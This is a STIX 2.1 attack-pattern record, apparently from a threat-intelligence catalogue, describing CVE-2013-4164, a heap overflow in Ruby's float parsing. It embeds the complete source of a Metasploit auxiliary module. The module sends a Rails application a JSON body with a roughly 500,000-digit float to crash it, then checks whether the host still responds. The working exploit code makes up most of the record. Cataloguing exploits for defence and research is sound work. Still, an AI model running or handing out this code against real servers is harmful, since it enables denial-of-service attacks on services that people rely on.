{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4d7010cd-8a31-4b83-ab79-24140b99c84b",
    "created": "2024-08-14T16:25:58.190896Z",
    "modified": "2024-08-14T16:25:58.1909Z",
    "name": "Ruby on Rails JSON Processor Floating Point Heap Overflow DoS",
    "description": " When Ruby attempts to convert a string representation of a large floating point decimal number to its floating point equivalent, a heap-based buffer overflow can be triggered. This module has been tested successfully on a Ruby on Rails application using Ruby version 1.9.3-p448 with WebRick and Thin web servers, where the Rails application crashes with a segfault error. Other versions of Ruby are reported to be affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/rails_json_float_dos.rb",
            "external_id": "rails_json_float_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4164"
        },
        {
            "source_name": "reference",
            "url": "https://www.ruby-lang.org/en/news/2013/11/22/ruby-1-9-3-p484-is-released/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ruby on Rails JSON Processor Floating Point Heap Overflow DoS',\n      'Description'    => %q{\n        When Ruby attempts to convert a string representation of a large floating point\n        decimal number to its floating point equivalent, a heap-based buffer overflow\n        can be triggered. This module has been tested successfully on a Ruby on Rails application\n        using Ruby version 1.9.3-p448 with WebRick and Thin web servers, where the Rails application\n        crashes with a segfault error. Other versions of Ruby are reported to be affected.\n      },\n      'Author'         =>\n        [\n          'Charlie Somerville', # original discoverer\n          'joev', # bash PoC\n          'todb', # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-4164' ],\n          [ 'OSVDB', '100113' ],\n          [ 'URL', 'https://www.ruby-lang.org/en/news/2013/11/22/ruby-1-9-3-p484-is-released/' ]\n        ],\n      'DisclosureDate' => '2013-11-22'))\n    register_options(\n      [\n        OptString.new('TARGETURI', [false, 'The URL of the vulnerable Rails application', '/']),\n        OptString.new('HTTPVERB', [false, 'The HTTP verb to use', 'POST'])\n      ])\n  end\n\n  def uri\n    normalize_uri(target_uri.path.to_s)\n  end\n\n  def verb\n    datastore['HTTPVERB'] || 'POST'\n  end\n\n  def digit_pattern\n    @digit_pattern ||= rand(10_000).to_s\n  end\n\n  def integer_part\n    digit_pattern\n  end\n\n  def multiplier\n    (500_000 * (1.0/digit_pattern.size)).to_i\n  end\n\n  def fractional_part\n    digit_pattern * multiplier\n  end\n\n  # The evil_float seems to require some repeating element. Maybe\n  # it's just superstition, but straight up 300_002-lenth random\n  # numbers don't appear to trigger the vulnerability. Also, these are\n  # easier to produce, and slightly better than the static \"1.1111...\"\n  # for 300,000 decimal places.\n  def evil_float_string\n    [integer_part,fractional_part].join('.')\n  end\n\n  def run\n    print_status \"Using digit pattern of #{digit_pattern} taken to #{multiplier} places\"\n    sploit = '['\n    sploit << evil_float_string\n    sploit << ']'\n    print_status \"Sending DoS HTTP#{datastore['SSL'] ? 'S' : ''} #{verb} request to #{uri}\"\n    target_available = true\n\n    begin\n      res = send_request_cgi(\n        {\n          'method'  => verb,\n          'uri'     => uri,\n          'ctype'   => \"application/json\",\n          'data'    => sploit\n        })\n    rescue ::Rex::ConnectionRefused\n      print_error \"Unable to connect. (Connection refused)\"\n      target_available = false\n    rescue ::Rex::HostUnreachable\n      print_error \"Unable to connect. (Host unreachable)\"\n      target_available = false\n    rescue ::Rex::ConnectionTimeout\n      print_error \"Unable to connect. (Timeout)\"\n      target_available = false\n    end\n\n    return unless target_available\n\n    print_status \"Checking availability\"\n    begin\n      res = send_request_cgi({\n        'method' => verb,\n        'uri' => uri,\n        'ctype' => \"application/json\",\n        'data' => Rex::Text.rand_text_alpha(1+rand(64)).to_json\n      })\n      if res and res.body and res.body.size > 0\n        target_available = true\n      else\n        print_good \"#{peer}#{uri} - DoS appears successful (No useful response from host)\"\n        target_available = false\n      end\n    rescue ::Rex::ConnectionError, Errno::ECONNRESET\n      print_good \"DoS appears successful (Host unreachable)\"\n      target_available = false\n    end\n\n    return unless target_available\n\n    print_error \"Target is still responsive, DoS was unsuccessful.\"\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-22"
}